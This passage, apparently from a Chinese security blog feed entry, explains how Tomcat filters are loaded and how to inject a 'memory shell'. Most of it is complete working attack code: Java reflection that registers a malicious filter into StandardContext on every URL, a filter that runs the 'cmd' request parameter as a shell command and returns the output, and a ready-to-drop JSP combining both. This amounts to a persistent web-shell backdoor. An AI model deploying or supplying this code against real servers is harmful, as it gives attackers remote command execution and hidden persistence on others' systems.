是一个HashMap结构，键为filter名，值为filterconfig</span><br><span class="line">filterconfig包含了filterdef</span><br><span class="line">filterdef直接与filter类相关联</span><br></pre></td></tr></table></figure><p>StandardWrapperValue#invoke 这一层分析完了，这一层是最麻烦的，向下两层将会亲切很多。</p><h4 id="下面的两层"><a href="#下面的两层" class="headerlink" title="下面的两层"></a>下面的两层</h4><p>向下分析来到ApplicationFilterChain#doFilter.这一层很简单，调了个internalDofilter就没了<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626210643466.png" alt="image-20210626210643466"></p><p>再向下分析来到ApplicationFilterChain#internalDoFilter。<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626210808889.png" alt="image-20210626210808889"></p><p>关键的地方圈出来了，大致就是通过filterchain里的filterconfig的getFilter方法（下图为getFilter方法，可以明显看到是返回了filter）从而获得filterdef里的filter，从而调用filter的dofilter，这就是大概的流程。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627113023603.png" alt="image-20210627113023603"></p><h4 id="加载过程流程图"><a href="#加载过程流程图" class="headerlink" title="加载过程流程图"></a>加载过程流程图</h4><p>文字总是有些贫瘠的，用图来说话就会明了许多。<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627115155496.png" alt="image-20210627115155496"></p><h3 id="FilterDef添加"><a href="#FilterDef添加" class="headerlink" title="FilterDef添加"></a>FilterDef添加</h3><p>我们如何把FilterDef与我们的Filter关联起来并添加到standardContext中呢？这个问题比较关键，因为我们必须将我们的FilterDef注入到内存才能让我们的Filter有被调用的可能性。</p><p>实际上呢，也很简单。流程上来说与Listener内存马差不多</p><p>打断点</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122501784.png" alt="image-20210627122501784"></p><p>跟进<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122632548.png" alt="image-20210627122632548"></p><p>再跟</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122645331.png" alt="image-20210627122645331"></p><p>继续跟</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122745165.png" alt="image-20210627122745165"></p><p>来到此处，与Listener内存马神似。<br>if判断里判断了程序是否在运行<br>context是standardContext，这里调用了它的addFilterDef来添加FilterDef。</p><h3 id="编写Filter内存马"><a href="#编写Filter内存马" class="headerlink" title="编写Filter内存马"></a>编写Filter内存马</h3><p>既然流程已经明白了，那写起来就不难了.<br>至于为什么要用反射，原因和Listener是一样的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">反射代码</span><br><span class="line">try &#123;</span><br><span class="line">            response.getWriter().write(&quot;a&quot;);</span><br><span class="line">            System.out.println(&quot;Servlet Get Message\n&quot;);</span><br><span class="line">            Object obj &#x3D; request.getServletContext();</span><br><span class="line">            Field field &#x3D; obj.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(obj);</span><br><span class="line">            field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext);</span><br><span class="line">            &#x2F;&#x2F;获取standardContext</span><br><span class="line"></span><br><span class="line">            FilterDef filterDef &#x3D; new FilterDef();</span><br><span class="line">            filterDef.setFilter(new MyFilter());</span><br><span class="line">            filterDef.setFilterName(&quot;MyFilter&quot;);</span><br><span class="line">            standardContext.addFilterDef(filterDef);</span><br><span class="line">            &#x2F;&#x2F;将FilterDef与filter关联，注入到内存</span><br><span class="line"></span><br><span class="line">            field &#x3D; standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            HashMap filterConfigs &#x3D; (HashMap) field.get(standardContext);&#x2F;&#x2F;获取filterConfigs</span><br><span class="line">            Constructor constructor &#x3D;</span><br><span class="line">                    Class.forName(&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;).</span><br><span class="line">                            getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">            constructor.setAccessible(true);</span><br><span class="line">            filterConfigs.put(&quot;MyFilter&quot;,constructor.newInstance(standardContext,filterDef));</span><br><span class="line">            &#x2F;&#x2F;将包含filterDef的filterConfig添加到filterConfigs</span><br><span class="line"></span><br><span class="line">            FilterMap filterMap &#x3D; new FilterMap();</span><br><span class="line">            filterMap.addURLPattern(&quot;&#x2F;*&quot;);</span><br><span class="line">            filterMap.setFilterName(&quot;MyFilter&quot;);</span><br><span class="line">            standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">            &#x2F;&#x2F;将该filterMap与filterConfig进行NAME绑定并放到filterMaps的首位</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; catch (IOException | NoSuchFieldException | IllegalAccessException | ClassNotFoundException | NoSuchMethodException | InstantiationException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">木马本体</span><br><span class="line">public class MyFilter implements Filter &#123;</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException &#123;</span><br><span class="line">        String cmder &#x3D; req.getParameter(&quot;cmd&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            Process ps &#x3D; Runtime.getRuntime().exec(cmder);</span><br><span class="line">            BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream()));</span><br><span class="line">            StringBuffer sb &#x3D; new StringBuffer();</span><br><span class="line">            String line;</span><br><span class="line">            while ((line &#x3D; br.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                &#x2F;&#x2F;执行结果加上回车</span><br><span class="line">                sb.append(line).append(&quot;&lt;br&gt;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            String result &#x3D; sb.toString();</span><br><span class="line">            resp.getWriter().write(result);</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            System.out.println(&quot;error &quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        chain.doFilter(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line">    public void init(FilterConfig config) throws ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>网上嫖的JSP</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.IOException&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.lang.reflect.Constructor&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.catalina.Context&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.util.HashMap&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">     Object obj &#x3D; request.getServletContext();</span><br><span class="line">     Field field &#x3D; obj.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">     field.setAccessible(true);</span><br><span class="line">     ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(obj);</span><br><span class="line">     field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">     field.setAccessible(true);</span><br><span class="line">     StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext);</span><br><span class="line"></span><br><span class="line">     FilterDef filterDef &#x3D; new FilterDef();</span><br><span class="line">     filterDef.setFilterName(&quot;testF&quot;);</span><br><span class="line">     standardContext.addFilterDef(filterDef);  &#x2F;&#x2F; 在context中添加filterMap时会去找一下是否存在对应的filterdef</span><br><span class="line">     Filter filter &#x3D; new testF();</span><br><span class="line">     filterDef.setFilter(filter); &#x2F;&#x2F; 将我们创建的filter与filterdef相关联起来</span><br><span class="line"></span><br><span class="line">     field &#x3D; standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class="line">     field.setAccessible(true);</span><br><span class="line">     HashMap hashMap &#x3D;  (HashMap) field.get(standardContext);</span><br><span class="line">     Constructor constructor &#x3D; Class.forName(&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;).getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">     constructor.setAccessible(true);</span><br><span class="line">     hashMap.put(&quot;testF&quot;,constructor.newInstance(standardContext,filterDef));</span><br><span class="line"></span><br><span class="line">     FilterMap filterMap &#x3D; new FilterMap();</span><br><span class="line">     filterMap.addURLPattern(&quot;&#x2F;*&quot;);</span><br><span class="line">     filterMap.setFilterName(&quot;testF&quot;);</span><br><span class="line">     standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">     System.out.println(&quot;filter ok !&quot;);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">     public class testF implements Filter &#123;</span><br><span class="line">          public void destroy() &#123;</span><br><span class="line">          &#125;</span><br><span class="line">          public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException &#123;</span><br><span class="line">               String cmder &#x3D; req.getParameter(&quot;cmd&quot;);</span><br><span class="line">               String[] cmd &#x3D; new String[]&#123;&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, cmder&#125;;</span><br><span class="line">               try &#123;</span><br><span class="line">                    Process ps &#x3D; Runtime.getRuntime().exec(cmd);</span><br><span class="line">                    BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream()));</span><br><span class="line">                    StringBuffer sb &#x3D; new StringBuffer();</span><br><span class="line">                    String line;</span><br><span class="line">                    while ((line &#x3D; br.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                         &#x2F;&#x2F;执行结果加上回车</span><br><span class="line">                         sb.append(line).append(&quot;&lt;br&gt;&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    String result &#x3D; sb.toString();</span><br><span class="line">                    resp.getWriter().write(result);</span><br><span class="line">               &#125;catch (Exception e)&#123;</span><br><span class="line">                    System.out.println(&quot;error &quot;);</span><br><span class="line">               &#125;</span><br><span class="line">               chain.doFilter(req,resp);</span><br><span class="line">          &#125;</span><br><span class="line">          public void init(FilterConfig config) throws ServletException &#123;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122022432.png" alt="image-20210627122022432"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>个人感觉这篇文章写的比较乱，特别是Filter内存马。<br>这也是我拖了3个月才来搞的东西，这学期事有点多，很多之前想搞的东西都没腾出时间弄。<br>这篇文章讲到的内存马实际上并没有实现完全的无文件落地，中间会有恶意JSP文件落地。更高级的攻击形式后面再搞吧。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://li9hu.top/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%80-%E5%88%9D%E6%8E%A2/">http://li9hu.top/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%80-%E5%88%9D%E6%8E%A2/</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/14622879.html#servletcontext">https://www.cnblogs.com/nice0e3/p/14622879.html#servletcontext</a></p><p><a href="https://blog.csdn.net/angry_program/article/details/116661899">https://blog.csdn.net/angry_program/article/details/116661899</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;tomcat内存马&quot;&gt;&lt;a href=&quot;#tomcat内存马&quot; class=&quot;headerlink&quot; title=&quot;tomcat内存马&quot;&gt;&lt;/a&gt;tomcat内存马&lt;/h1&gt;&lt;h2 id=&quot;tomcat-容器&quot;&gt;&lt;a href=&quot;#tomcat-容器&quot; class</summary>
      
    
    
    
    
    <category term="java开发与安全" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
